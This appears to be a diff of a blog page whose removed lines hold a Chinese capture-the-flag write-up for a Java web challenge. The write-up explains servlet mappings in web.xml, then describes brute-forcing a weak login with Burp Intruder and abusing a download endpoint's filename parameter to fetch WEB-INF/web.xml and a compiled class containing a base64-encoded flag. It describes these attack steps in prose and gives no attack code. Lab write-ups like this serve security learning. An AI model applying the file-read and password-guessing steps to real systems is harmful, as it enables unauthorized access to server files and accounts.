-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<p>弱口令，在Bp的Intruder模块下破解密码</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
-<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<blockquote>
-<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
-</blockquote>
-<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
-<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
-<p>下载打开help.docx中并没有flag</p>
-<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
-<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
-<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
-<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -2131,13 +2337,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">48k</span>
+    <span title="Word count total">63k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">1:28</span>
+    <span title="Reading time total">1:55</span>
   </span>
 </div>
 <div class="busuanzi-count">
